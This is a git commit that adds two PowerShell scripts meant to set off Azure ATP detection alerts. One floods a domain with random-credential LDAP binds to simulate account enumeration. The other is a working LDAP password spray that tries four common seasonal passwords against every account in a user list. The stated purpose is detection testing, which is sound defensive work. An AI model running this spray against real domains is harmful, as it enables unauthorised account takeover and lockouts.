0a72f389aee9590a8db9fc47d02c98efa3c3dc5c
Kjetil Nordlund <kjetil@northgrove.no>
2019-07-29 10:21:30 +0200

    Azure atp triggers

---
+++ AzureATP/Account_enumeration_reconnaissance.ps1
@@ -0,0 +1,32 @@
+﻿
+# Script to try authenticating with random user with random password to get "ATP Account enumeration reconnaissance" alert triggered
+
+
+    $DomainFQDN = "yourdomain.name"
+    $domain = "yourdomain"
+    $x = $null
+    $validUser = "victim"
+    $validuserpass = "Passord123"
+    $tries = 1000
+
+    do
+    {
+        write-host $x
+        $username = $domain + "\" + $(-join ((48..57) + (97..122) | Get-Random -Count 10 | % {[char]$_}))
+        $password = $(-join ((48..57) + (97..122) | Get-Random -Count 10 | % {[char]$_}))
+        $DomainObj = "LDAP://" + $DomainFQDN
+        $DomainBind = New-Object System.DirectoryServices.DirectoryEntry($DomainObj,$UserName,$Password)
+        $DomainName = $DomainBind.distinguishedName
+        write-host "user: " $username
+        write-host "password: " $password
+        write-host "Domain: " $DomainName
+        $x += 1
+    }
+    until ($x -gt $tries)
+
+
+    #Test with one valid user
+    $DomainObj = "LDAP://" + $DomainFQDN
+    $DomainBind = New-Object System.DirectoryServices.DirectoryEntry($DomainObj,"$domain\$validuser","$validuserpass")
+    $DomainName = $DomainBind.distinguishedName
+
---
+++ AzureATP/LDAP_Bind_password_spray.ps1
@@ -0,0 +1,44 @@
+﻿$usersfile = get-content .\all_domain_users.txt
+$DomainFQDN = "yourdomain.name"
+$dcFQDN = "dc.yourdomain.name"
+$domainname = "domain"
+$domainending = "no"
+$mostusedpass1 = "Passord123"
+$mostusedpass2 = "Passw0rd"
+$mostusedpass3 = "Sommer2019"
+$mostusedpass4 = "Vinter2019"
+
+
+
+foreach ($user in $usersfile)
+{
+    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass1")
+    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
+    $searcher.filter = "((objectClass=site))"
+    $searcher.FindAll()
+}
+
+
+foreach ($user in $usersfile)
+{
+    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass2")
+    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
+    $searcher.filter = "((objectClass=site))"
+    $searcher.FindAll()
+}
+
+foreach ($user in $usersfile)
+{
+    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass3")
+    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
+    $searcher.filter = "((objectClass=site))"
+    $searcher.FindAll()
+}
+
+foreach ($user in $usersfile)
+{
+    $domaininfo = new-object DirectoryServices.DirectoryEntry("LDAP://$dcfqdn/cn=sites,cn=configuration,dc=$domainname,dc=$domainending","$($user)","$mostusedpass4")
+    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domaininfo)
+    $searcher.filter = "((objectClass=site))"
+    $searcher.FindAll()
+}
